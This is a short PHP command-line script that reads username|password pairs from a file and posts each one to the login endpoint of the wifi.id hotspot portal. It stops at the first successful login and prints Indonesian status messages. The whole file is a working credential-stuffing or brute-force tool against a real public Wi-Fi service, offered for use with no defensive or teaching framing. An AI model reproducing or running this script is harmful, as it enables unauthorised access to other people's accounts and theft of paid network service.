<?php
error_reporting(1);
if ($argv[1] == "f") {
    $filenya = $argv[2];
    $fn = fopen($filenya,"r");

    while(! feof($fn))  {
  
          $result = fgets($fn);
          $data = explode("|" , $result);
          $usernameku = $data[0];
          $passwordku = $data[1];

    $ch = curl_init();
    $headers = [
    'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
    'Host: welcome2.wifi.id',
    'Referer: welcome2.wifi.id',
    'User-Agent: PostmanRuntime/7.20.1'
];

curl_setopt($ch, CURLOPT_URL,"https://welcome2.wifi.id/authnew/login/check_login.php?ipc=(isi ip mu)&gw_id=WAG-D4-GBL&mac=(isi mac mu)&redirect=http://www.msftconnecttest.com/redirect&wlan=ABRABR00008-N/TLK-CI-13580:@wifi.id");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            'username='.$usernameku.'@spin2&password='.$passwordku);

// curl_setopt($ch, CURLOPT_POSTFIELDS, 
//          http_build_query(array('postvar1' => 'value1')));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);

curl_close ($ch);
$hasil = json_decode($server_output);
if ($hasil->{"message"} == "Login Sukses") {
    echo "Get Akun......\n";
    sleep(3);
    echo "Sukses Login \n";
break;
} elseif ($hasil->{"message"} == "Invalid"){
    echo "Get Akun......\n";
    sleep(3);
    echo "Masukin password yg bner paokkk \n";
} elseif ($hasil->{"message"} == "Login Gagal"){
    echo "Get Akun......\n";
    sleep(3);
    echo "Gagal Login , Periksa Koneksi \n";
} else {
    echo "Get Akun......\n";
    sleep(3);
    echo "Failed \n";
}

    }
    fclose($fn);
}else{
    print "Format Salah";
};
?>